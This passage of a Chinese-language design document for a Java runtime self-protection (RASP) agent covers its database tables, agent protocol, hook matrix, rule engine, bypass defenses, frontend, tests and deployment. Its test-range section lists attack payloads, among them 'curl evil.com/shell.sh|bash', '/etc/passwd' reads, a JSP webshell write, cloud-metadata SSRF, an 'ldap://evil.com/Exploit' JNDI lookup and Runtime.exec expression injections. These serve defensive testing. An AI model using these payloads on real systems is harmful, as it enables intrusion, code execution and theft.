    agent_id    VARCHAR(64)     NOT NULL UNIQUE COMMENT 'Agent唯一标识',
    app_name    VARCHAR(128)    NOT NULL COMMENT '应用名称',
    host_ip     VARCHAR(64)     COMMENT '主机IP',
    jvm_version VARCHAR(32)     COMMENT 'JVM版本',
    java_version VARCHAR(16)   COMMENT 'Java版本',
    start_time  TIMESTAMP       COMMENT 'Agent启动时间',
    status      VARCHAR(16)     NOT NULL DEFAULT 'ONLINE' COMMENT '状态(ONLINE/OFFLINE)',
    last_heartbeat TIMESTAMP    COMMENT '最后心跳时间',
    config_hash VARCHAR(64)     COMMENT '当前配置哈希',
    version     VARCHAR(32)     COMMENT 'Agent版本',
    created_at  TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at  TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_status (status),
    INDEX idx_last_heartbeat (last_heartbeat)
);

-- 安全策略表
CREATE TABLE rasp_policies (
    id          BIGINT AUTO_INCREMENT PRIMARY KEY,
    policy_name VARCHAR(128)    NOT NULL UNIQUE COMMENT '策略名称',
    attack_type VARCHAR(32)     NOT NULL COMMENT '适用的攻击类型',
    rule_type   VARCHAR(32)     NOT NULL COMMENT '规则类型(REGEX/WHITELIST/BLACKLIST)',
    rule_content TEXT           NOT NULL COMMENT '规则内容',
    action      VARCHAR(16)     NOT NULL COMMENT '匹配动作(BLOCK/ALERT/PASS)',
    priority    INT             NOT NULL DEFAULT 0 COMMENT '优先级(越大越优先)',
    enabled     BOOLEAN         NOT NULL DEFAULT TRUE COMMENT '是否启用',
    description VARCHAR(512)    COMMENT '策略描述',
    created_at  TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at  TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_attack_type (attack_type),
    INDEX idx_enabled (enabled)
);
```

#### 3.5.2 Agent 通信协议

```json
// === 心跳上报 (Agent → Server, 每30秒) ===
POST /api/agent/heartbeat
{
    "agent_id": "rasp-agent-abc123",
    "app_name": "my-web-app",
    "status": "ONLINE",
    "stats": {
        "uptime_seconds": 86400,
        "total_requests": 1500000,
        "blocked_attacks": 47,
        "hook_count": 85000,
        "avg_detect_time_us": 15,
        "memory_used_mb": 45
    },
    "timestamp": 1751902000000
}

// === 告警上报 (Agent → Server, 实时) ===
POST /api/alarm/report
{
    "alarm_id": "uuid-xxx",
    "agent_id": "rasp-agent-abc123",
    "app_name": "my-web-app",
    "attack_type": "SQL_INJECTION",
    "severity": "HIGH",
    "action": "BLOCK",
    "message": "SQL injection detected in /api/users",
    "evidence": {
        "sql": "SELECT * FROM users WHERE id='1' OR '1'='1'",
        "param_name": "id",
        "param_value": "1' OR '1'='1"
    },
    "request_uri": "/api/users?id=1%27+OR+%271%27%3D%271",
    "remote_addr": "192.168.1.100",
    "stack_trace": "com.example.dao.UserDao.findById(UserDao.java:25)\n...",
    "timestamp": 1751902000000
}

// === 策略同步 (Server → Agent, Agent 轮询) ===
GET /api/policy/sync?agent_id=xxx&current_hash=abc123
Response:
{
    "has_update": true,
    "policies": [
        {
            "policy_name": "block_union_select",
            "attack_type": "SQL_INJECTION",
            "rule_type": "REGEX",
            "rule_content": "(?i)\\bUNION\\b.+\\bSELECT\\b",
            "action": "BLOCK",
            "priority": 100
        }
    ],
    "new_hash": "def456"
}
```

---

## 四、Hook 系统设计

### 4.1 Hook 点覆盖矩阵

| 序号 | 攻击类型 | Hook 目标类 | Hook 方法 | Hook 时机 | 检测器 | 优先级 |
|------|---------|------------|-----------|----------|--------|-------|
| H01 | SQL注入 | `java.sql.Statement` | `executeQuery/executeUpdate/execute` | BEFORE | SqlDetector | P0 |
| H02 | SQL注入 | `java.sql.PreparedStatement` | `executeQuery/executeUpdate/execute` | BEFORE | SqlDetector | P0 |
| H03 | 命令执行 | `java.lang.ProcessBuilder` | `start` | BEFORE | CommandDetector | P0 |
| H04 | 命令执行 | `java.lang.Runtime` | `exec` | BEFORE | CommandDetector | P0 |
| H05 | 反序列化 | `java.io.ObjectInputStream` | `resolveClass` | BEFORE | DeserDetector | P0 |
| H06 | 文件读取 | `java.io.FileInputStream` | `<init>` | BEFORE | FileDetector | P0 |
| H07 | 文件读取 | `java.nio.file.Files` | `readAllBytes/readString/newInputStream` | BEFORE | FileDetector | P0 |
| H08 | 文件写入 | `java.io.FileOutputStream` | `<init>` | BEFORE | FileDetector | P0 |
| H09 | 文件写入 | `java.nio.file.Files` | `write/writeString/newOutputStream` | BEFORE | FileDetector | P0 |
| H10 | SSRF | `java.net.URL` | `openConnection` | BEFORE | SsrfDetector | P1 |
| H11 | SSRF | `java.net.HttpURLConnection` | `connect` | BEFORE | SsrfDetector | P1 |
| H12 | JNDI注入 | `javax.naming.InitialContext` | `lookup` | BEFORE | JndiDetector | P0 |
| H13 | SpEL注入 | `SpelExpressionParser` | `parseExpression` | BEFORE | ExprDetector | P1 |
| H14 | OGNL注入 | `ognl.Ognl` | `parseExpression` | BEFORE | ExprDetector | P1 |
| H15 | XSS | `HttpServletResponse` | `getWriter/write` | BEFORE | XssDetector | P1 |
| H16 | JSP Webshell | `javax.servlet.Servlet` | `service` | BEFORE | WebshellDetector | P1 |
| H17 | 线程绕过 | `java.lang.Thread` | `start` | BEFORE | - | P2 |
| H18 | 反射绕过 | `java.lang.reflect.Method` | `invoke` | BEFORE | - | P2 |
| H19 | 类加载 | `java.lang.ClassLoader` | `loadClass` | BEFORE | MemoryShell | P2 |
| H20 | 内存马 | `ServletContext` | `addServlet/addFilter/addListener` | BEFORE | MemoryShell | P2 |
| H21 | JNI绕过 | `java.lang.System` | `loadLibrary/load` | BEFORE | - | P2 |

### 4.2 Hook 优先级和性能分级

```
优先级层级:
  P0 (必须): SQL注入、命令执行、反序列化、文件操作、JNDI注入
    → 默认启用，不可关闭，全量检测
  P1 (推荐): SSRF、表达式注入、XSS、WebShell、内存马
    → 默认启用，可在配置中关闭，支持采样检测
  P2 (可选): 线程/反射/类加载监控
    → 默认关闭，高安全场景手动开启，性能影响需评估
```

---

## 五、检测引擎设计

### 5.1 双引擎架构

```
                      ┌──────────────────────┐
                      │     HookEvent         │
                      └──────────┬───────────┘
                                 │
                    ┌────────────▼────────────┐
                    │      DecisionMaker      │
                    │    (多引擎决策器)        │
                    └────────┬───────┬────────┘
                             │       │
              ┌──────────────▼┐  ┌───▼──────────────┐
              │  RuleEngine   │  │  TaintTracker     │
              │  (规则引擎)    │  │  (污点追踪引擎)   │
              │               │  │                   │
              │ • 快速正则     │  │ • 污点标记传播     │
              │ • 参数关联     │  │ • 敏感Sink检查    │
              │ • 白/黑名单    │  │ • 调用链分析      │
              │ • 同策略缓存   │  │                   │
              └──────┬────────┘  └───┬───────────────┘
                     │               │
                     ▼               ▼
              ┌──────────────────────────────┐
              │      聚合判决结果             │
              │  任一引擎 BLOCK → BLOCK      │
              │  任一引擎 ALERT → ALERT      │
              │  全部 PASS → PASS           │
              └──────────────────────────────┘
```

### 5.2 规则引擎详细设计

```java
/**
 * 规则引擎
 * 
 * 规则格式（配置化）：
 * - rule_type: REGEX / CONTAINS / PARAM_TAINT / WHITELIST / BLACKLIST
 * - 支持 AND/OR 组合条件
 * - 支持规则热更新（从 rasp-server 拉取最新规则）
 * 
 * 规则缓存策略：
 * - 规则编译结果缓存（如编译后的 Pattern 对象）
 * - 同请求同参数的检测结果缓存（first-hit 缓存，有效期同请求生命周期）
 */
public class RuleEngine implements DetectEngine {
    
    // 按攻击类型分组的规则
    private final Map<AttackType, List<PolicyRule>> rulesByType;
    
    // 编译缓存：Pattern 对象等
    private final LoadingCache<String, Pattern> patternCache;
    
    @Override
    public DetectResult check(HookEvent event, RaspContext context) {
        List<PolicyRule> rules = rulesByType.get(event.getAttackType());
        if (rules == null || rules.isEmpty()) return DetectResult.PASS;
        
        for (PolicyRule rule : rules) {
            if (!rule.isEnabled()) continue;
            
            switch (rule.getRuleType()) {
                case REGEX:
                    if (matchRegex(rule, event)) {
                        return buildBlockResult(rule, event);
                    }
                    break;
                case PARAM_TAINT:
                    if (context != null && context.isParamTainted(event.getTargetValue())) {
                        return buildBlockResult(rule, event);
                    }
                    break;
                case BLACKLIST:
                    if (rule.getValues().contains(event.getTargetValue())) {
                        return buildBlockResult(rule, event);
                    }
                    break;
                case WHITELIST:
                    if (rule.getValues().contains(event.getTargetValue())) {
                        return DetectResult.PASS; // 白名单直接放行
                    }
                    break;
            }
        }
        
        return DetectResult.PASS;
    }
}
```

### 5.3 绕过防护设计

| 绕过手段 | 防护措施 |
|---------|---------|
| 线程转移 | Hook `Thread.start()` 和线程池 `execute()`，传播 Context |
| 未覆盖 API | 持续扩充 Hook 矩阵，提供覆盖度报告 |
| JNI 绕过 | Hook `System.loadLibrary()` + `Runtime.loadLibrary()` |
| 反射绕过 | Hook `Method.invoke()`，检查调用链来源 |
| 条件竞争 | 在 Hook 回调中使用不可变参数快照 |
| Agent 卸载 | 监控 Attach API 调用，防止 Agent 被移除 |
| Lambda 绕过 | 使用 `LambdaMetafactory` 的 Bootstrap 方法插桩 |
| ClassLoader 绕过 | 监控非标准 ClassLoader 的类加载行为 |

---

## 六、性能设计

### 6.1 性能目标

| 指标 | 目标值 | 测量方法 |
|------|--------|---------|
| QPS 衰减 | < 5%（纯文本） | JMH 基准测试 |
| QPS 衰减 | < 8%（数据库查询） | JMH + 实际应用测试 |
| 单次检测延迟 | < 50μs (P99) | 内置性能统计 |
| 启动时间增加 | < 30% | 多次冷启动平均 |
| 内存增加 | < 80MB | GC 日志分析 |
| CPU 增加 | < 3% | top/htop 持续监控 |

### 6.2 优化策略

```java
/**
 * 性能优化清单：
 * 
 * 1. Hook 点裁剪
 *    - 配置文件控制每个 Hook 类型的启用/禁用
 *    - 不需要 SSRF 检测的业务可以关闭对应 Hook
 * 
 * 2. 检测采样
 *    - 高 QPS 场景支持检测采样率配置
 *    - 例如：sampling_rate=0.1 → 只检测 10% 请求
 *    - 采样策略：基于请求 ID 哈希的一致性采样
 * 
 * 3. 路径缓存
 *    - 相同类+相同字节码哈希 → 复用已处理的字节码
 *    - 避免重复 ASM 解析
 * 
 * 4. 结果短路
 *    - 白名单命中 → 直接放行，不执行后续检测
 *    - 第一个引擎 BLOCK → 不再执行其他引擎
 * 
 * 5. 异步化
 *    - 告警日志写入 → 异步（RingBuffer + 单线程消费）
 *    - 告警上报 → 异步（批量发送）
 *    - Context 统计信息更新 → 异步
 * 
 * 6. 对象池
 *    - HookEvent 对象池化（避免频繁 GC）
 *    - 小数组缓存（参数打包）
 * 
 * 7. 精准类过滤
 *    - L1 缓存：ClassName → boolean 的 HashSet（O(1) 查找）
 *    - L2 缓存：已处理类的签名哈希
 *    - 非 Hook 目标类 → < 100ns 返回（仅一次 HashSet 查找）
 */
```

---

## 七、前端设计

### 7.1 页面结构

| 页面 | 路由 | 说明 |
|------|------|------|
| 安全大盘 | `/` | 攻击趋势图、实时告警流、Agent 状态总览、Top 攻击类型 |
| 告警列表 | `/alarms` | 可分页、筛选（类型/严重度/时间范围/应用）的告警列表 |
| 告警详情 | `/alarms/:id` | 详细证据（SQL/命令/调用栈）、请求上下文、关联分析 |
| Agent 管理 | `/agents` | Agent 列表、在线状态、心跳时间、版本、配置哈希 |
| 策略管理 | `/policies` | 策略列表、新增/编辑/启用/禁用、YAML/JSON 编辑器 |
| 系统设置 | `/settings` | 全局配置、通知设置、数据保留策略 |

### 7.2 技术栈

```
框架: React 18 + TypeScript
构建: Vite
UI: Ant Design 5
图表: @ant-design/charts (基于 G2)
状态管理: React Context + useReducer (轻量级，无需 Redux)
HTTP 请求: axios
路由: react-router-dom v6
```

### 7.3 Dashboard 设计

```
┌─────────────────────────────────────────────────────────────┐
│  🔒 My-RASP Security Dashboard              2026-07-07    │
├──────────┬──────────┬──────────┬────────────┬──────────────┤
│ 总请求数  │ 阻断攻击  │ 告警事件  │ 在线Agent  │ 活跃策略数    │
│ 1.5M     │ 47       │ 128      │ 12        │ 86          │
│ ↑12%     │ ↑3       │ ↓5       │ ONLINE    │ ENABLED     │
├──────────┴──────────┴──────────┴────────────┴──────────────┤
│                                                             │
│  ┌─────────────────────────┐  ┌──────────────────────────┐ │
│  │   攻击趋势 (24h)         │  │   攻击类型分布 (饼图)     │ │
│  │   📈 折线图              │  │   🥧 SQL:45% CMD:20%    │ │
│  │                         │  │   DESER:15% SSRF:10%    │ │
│  └─────────────────────────┘  └──────────────────────────┘ │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │   实时告警流（WebSocket 推送）                        │   │
│  │   [HIGH] 14:32:11 SQL注入 /api/users BLOCKED       │   │
│  │   [HIGH] 14:32:05 命令执行 /api/ping BLOCKED        │   │
│  │   [MED]  14:31:58 SSRF尝试 /api/proxy ALERT         │   │
│  │   [HIGH] 14:31:42 反序列化 /api/import BLOCKED      │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 八、测试策略

### 8.1 测试层次

| 层次 | 工具 | 覆盖目标 |
|------|------|---------|
| 单元测试 | JUnit 5 + Mockito | 每个 Detector/Util 类 > 80% 行覆盖 |
| 集成测试 | Spring Boot Test + H2 | Agent 加载 → Hook 触发 → 检测 → 阻断 全链路 |
| 性能测试 | JMH | 各 Hook 点微基准测试 |
| 安全测试 | 自建靶场 + OWASP ZAP | 覆盖 10 类攻击，含绕过场景 |
| 兼容性测试 | Testcontainers | Tomcat/Jetty/Undertow × Java 8/11/17/21 |
| 压力测试 | JMeter / wrk | 1K/5K/10K QPS 下的性能衰退 |

### 8.2 测试靶场攻击场景

```
# SQL注入
GET  /sql-injection/union?id=1 UNION SELECT 1,2,3
GET  /sql-injection/boolean?id=1' OR '1'='1
POST /sql-injection/login  username=admin'--&password=xxx

# 命令执行
GET  /cmd/ping?ip=127.0.0.1;cat /etc/passwd
GET  /cmd/exec?cmd=whoami
POST /cmd/rce  cmd=curl evil.com/shell.sh|bash

# 反序列化
POST /deser/java  (binary payload with CommonsCollections5 gadget)

# 文件操作
GET  /file/read?path=../../../etc/passwd
POST /file/write?path=shell.jsp&content=<%Runtime.getRuntime().exec("cmd")%>

# SSRF
GET  /ssrf/fetch?url=http://169.254.169.254/latest/meta-data/
GET  /ssrf/fetch?url=file:///etc/passwd

# JNDI注入
GET  /jndi/lookup?url=ldap://evil.com/Exploit

# 表达式注入
POST /spel/eval  expression=T(java.lang.Runtime).getRuntime().exec('whoami')
POST /ognl/eval  expression=@java.lang.Runtime@getRuntime().exec('whoami')

# XSS
GET  /xss/reflect?msg=<script>alert(1)</script>

# WebShell
POST /shell.jsp  cmd=whoami
```

### 8.3 绕过测试场景

```
# 线程转移绕过
POST /bypass/thread  payload=...(在新线程中执行恶意操作)

# 反射绕过
POST /bypass/reflect  target=Runtime&method=exec&args=calc

# 编码绕过
GET  /sql-injection/union?id=%2555%254eION%2553ELECT  (双重URL编码)

# JNI绕过
POST /bypass/jni  (上传并加载恶意so/dll)
```

---

## 九、部署方案

### 9.1 Premain 模式（推荐）

```bash
# 1. 下载 Agent
wget https://github.com/thunderzzz1/my-java-rasp/releases/latest/rasp-agent.jar

# 2. 配置 rasp.yml
cp rasp-agent.jar:/rasp.yml /opt/rasp/
vim /opt/rasp/rasp.yml

# 3. 启动应用
java -javaagent:/opt/rasp/rasp-agent.jar \
     -Drasp.config=/opt/rasp/rasp.yml \
     -Drasp.server=http://rasp-server:8080 \
     -jar my-app.jar
```

### 9.2 Agentmain 模式（动态注入）

```bash
# 1. 找到目标 JVM PID
jps -l | grep my-app
# 输出: 12345 my-app.jar

# 2. 手动注入
java -jar rasp-attach.jar \
     --pid 12345 \
     --agent /opt/rasp/rasp-agent.jar \
     --config /opt/rasp/rasp.yml

# 3. 或通过 rasp-server 一键注入
curl -X POST http://rasp-server:8080/api/agent/attach \
     -H "Content-Type: application/json" \
     -d '{"pid": 12345, "agent_version": "1.0.0"}'
```

### 9.3 Docker/K8s 部署

```dockerfile
# Dockerfile 示例
FROM openjdk:11-jre-slim
COPY target/my-app.jar /app/my-app.jar
COPY rasp-agent.jar /opt/rasp/rasp-agent.jar
COPY rasp.yml /opt/rasp/rasp.yml

ENV JAVA_OPTS="-javaagent:/opt/rasp/rasp-agent.jar \
               -Drasp.config=/opt/rasp/rasp.yml"

ENTRYPOINT ["sh", "-c", "java $JAVA_OPTS -jar /app/my-app.jar"]
```

### 9.4 管理后台部署

```bash
# rasp-server
java -jar rasp-server.jar \
     --spring.datasource.url=jdbc:mysql://localhost:3306/rasp \
     --spring.datasource.username=rasp \
     --spring.datasource.password=xxx

# rasp-web (Nginx 静态部署)
cd rasp-web && npm run build
cp -r dist/* /var/www/rasp-web/
```

---

## 十、附录

### A. Maven 父 POM 配置

```xml
<groupId>com.rasp</groupId>
<artifactId>my-java-rasp</artifactId>
<version>1.0.0-SNAPSHOT</version>
<packaging>pom</packaging>

<properties>
    <java.version>1.8</java.version>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
    <asm.version>9.7.1</asm.version>
    <junit.version>5.10.0</junit.version>
    <spring-boot.version>2.7.18</spring-boot.version>
</properties>

<modules>
    <module>rasp-commons</module>
    <module>rasp-core</module>
    <module>rasp-detector</module>
    <module>rasp-hooks</module>
    <module>rasp-agent</module>
    <module>rasp-server</module>
    <module>rasp-test-target</module>
</modules>
```

### B. MANIFEST.MF 模板

```
Manifest-Version: 1.0
Premain-Class: com.rasp.agent.RaspPremain
Agent-Class: com.rasp.agent.RaspAgentMain
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Can-Set-Native-Method-Prefix: true
Boot-Class-Path: rasp-agent.jar
```

### C. 关键性能指标监控

```java
// Agent 内置性能统计
public class PerformanceStats {
    // 各类操作的耗时统计（微秒）
    private final Map<String, LongAdder> totalTimes = new ConcurrentHashMap<>();
    private final Map<String, LongAdder> totalCounts = new ConcurrentHashMap<>();
    
    public void record(String operation, long nanoTime) {
        totalTimes.computeIfAbsent(operation, k -> new LongAdder())
            .add(nanoTime);
        totalCounts.computeIfAbsent(operation, k -> new LongAdder())
            .increment();
    }
    
    public double getAvgMicros(String operation) {
        long total = totalTimes.getOrDefault(operation, new LongAdder()).sum();
        long count = totalCounts.getOrDefault(operation, new LongAdder()).sum();
        return count > 0 ? (double) total / count / 1000.0 : 0;
    }
}
```
